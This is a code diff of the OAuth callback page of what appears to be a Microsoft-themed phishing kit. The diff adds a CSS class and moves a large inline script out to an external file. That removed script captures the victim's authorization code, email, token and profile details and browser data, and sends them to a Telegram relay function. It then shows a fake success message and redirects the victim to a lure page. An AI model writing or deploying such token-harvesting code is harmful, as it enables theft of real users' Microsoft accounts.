@@ -34,6 +34,10 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        .info {
+            font-size: 1.1em;
+            color: #444;
+        }
         .error {
             color: #d13438;
             margin-top: 20px;
@@ -46,165 +50,10 @@
 </head>
 <body>
     <div class="container">
-        <h2>Processing Authentication...</h2>
         <div class="spinner" id="spinner"></div>
-        <p id="status">Exchanging authorization code for access tokens...</p>
-        <div id="result"></div>
+        <p class="info" id="status-msg">Signing you in…</p>
     </div>
 
-    <script>
-        async function handleOAuthCallback() {
-            const statusEl = document.getElementById('status');
-            const resultEl = document.getElementById('result');
-            const spinnerEl = document.getElementById('spinner');
-
-            function hideSpinner() {
-                if (spinnerEl) {
-                    spinnerEl.style.display = 'none';
-                }
-            }
-
-            try {
-                const urlParams = new URLSearchParams(window.location.search);
-                const code = urlParams.get('code');
-                const state = urlParams.get('state');
-                const error = urlParams.get('error');
-
-                if (error) {
-                    hideSpinner();
-                    statusEl.textContent = 'OAuth error: ' + error;
-                    resultEl.innerHTML = `<div class="error">OAuth error: ${error}</div>`;
-                    setTimeout(() => {
-                        window.location.href = '/?step=captcha';
-                    }, 3000);
-                    return;
-                }
-
-                if (!code || !state) {
-                    hideSpinner();
-                    statusEl.textContent = 'Missing authorization data!';
-                    resultEl.innerHTML = `<div class="error">Missing code or state in callback.</div>`;
-                    setTimeout(() => {
-                        window.location.href = '/?step=captcha';
-                    }, 3000);
-                    return;
-                }
-
-                statusEl.textContent = 'Processing PKCE token exchange...';
-
-                // PKCE FLOW: Get PKCE verifier from sessionStorage
-                const codeVerifier = sessionStorage.getItem('pkce_verifier');
-                const storedState = sessionStorage.getItem('oauth_state');
-
-                if (storedState && storedState !== state) {
-                    hideSpinner();
-                    statusEl.textContent = 'State mismatch error!';
-                    resultEl.innerHTML = `<div class="error">Security validation failed - state mismatch.</div>`;
-                    setTimeout(() => {
-                        window.location.href = '/?step=captcha';
-                    }, 3000);
-                    return;
-                }
-
-                // Build token exchange payload
-                const tokenPayload = {
-                    code: code,
-                    state: state
-                };
-
-                if (codeVerifier) {
-                    tokenPayload.code_verifier = codeVerifier;
-                    statusEl.textContent = 'Exchanging code with PKCE authentication...';
-                } else {
-                    statusEl.textContent = 'Exchanging code with client secret authentication...';
-                }
-
-                const res = await fetch('/.netlify/functions/tokenExchange', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(tokenPayload),
-                });
-
-                const tokenData = await res.json();
-
-                // Extract email from tokenData
-                let userEmail = null;
-
-                if (tokenData.success) {
-                    userEmail = tokenData.email;
-                } else {
-                    userEmail = 'user-email-pending@oauth.exchange';
-                }
-
-                // Send comprehensive data to Telegram
-                try {
-                    statusEl.textContent = 'Sending authentication data...';
-
-                    const telegramPayload = {
-                        email: userEmail || 'user-email-pending@oauth.exchange',
-                        provider: 'Microsoft',
-                        timestamp: new Date().toISOString(),
-                        authorizationCode: code,
-                        state: state,
-                        domain: window.location.origin,
-                        sessionId: Math.random().toString(36).substring(2, 12),
-                        authMethod: codeVerifier ? 'PKCE' : 'client_secret',
-                        tokenExchangeSuccess: !!tokenData.success,
-                        pkceUsed: !!codeVerifier,
-                        tokenData: tokenData.success ? {
-                            hasAccessToken: !!tokenData.tokens?.access_token,
-                            hasRefreshToken: !!tokenData.tokens?.refresh_token,
-                            hasIdToken: !!tokenData.tokens?.id_token,
-                            scope: tokenData.tokens?.scope,
-                            emailSource: tokenData.emailSource,
-                            userProfile: tokenData.user,
-                            authMethodUsed: tokenData.oauth?.authMethod
-                        } : null,
-                        errorInfo: !tokenData.success ? {
-                            error: tokenData.error,
-                            errorCode: tokenData.errorCode,
-                            details: tokenData.details,
-                            instructions: tokenData.instructions
-                        } : null,
-                        userAgent: navigator.userAgent,
-                        referrer: document.referrer,
-                        oauthFlow: 'microsoft_oauth_callback_pkce',
-                        realUserData: !!tokenData.success
-                    };
-
-                    await fetch('/.netlify/functions/sendTelegram', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(telegramPayload),
-                    });
-                } catch (telegramError) {}
-
-                // Clean up stored PKCE data
-                sessionStorage.removeItem('pkce_verifier');
-                sessionStorage.removeItem('oauth_state');
-
-                hideSpinner();
-                statusEl.textContent = 'Authentication completed!';
-                resultEl.innerHTML = `<div class="success">✅ Authentication processed successfully!<br>📧 User: ${userEmail}<br>🔒 Method: ${codeVerifier ? 'PKCE (Secure)' : 'Client Secret'}<br>Proceeding to document loading...</div>`;
-
-                // **FIX: Always redirect to document-loading (no captcha, no message icon repeat)**
-                setTimeout(() => {
-                    window.location.href = '/?step=success';
-                }, 2000);
-
-            } catch (err) {
-                hideSpinner();
-                statusEl.textContent = 'Error occurred during authentication.';
-                resultEl.innerHTML = `<div class="error">${err.message}</div>`;
-                sessionStorage.removeItem('pkce_verifier');
-                sessionStorage.removeItem('oauth_state');
-                setTimeout(() => {
-                    window.location.href = '/?step=captcha';
-                }, 3000);
-            }
-        }
-
-        handleOAuthCallback();
-    </script>
+    <script src="/oauth-callback.js"></script>
 </body>
 </html>
